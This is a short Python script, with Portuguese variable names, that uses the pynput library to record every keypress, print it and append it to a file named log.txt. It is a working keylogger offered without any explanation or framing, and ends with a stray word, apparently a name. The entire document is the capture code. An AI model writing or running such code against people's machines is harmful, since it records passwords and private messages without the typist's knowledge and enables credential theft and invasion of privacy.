from pynput.keyboard import Listener


def keyscan(tecla):
    tecla = str(tecla).replace("'","")
    if len(tecla) > 1:
       tecla = "[{}]".format(tecla)
    print(tecla)


    with open('log.txt', 'a') as arquivo_log:
        arquivo_log.write(tecla)

with Listener(on_press=keyscan) as listener:
 listener.join()
endrigo
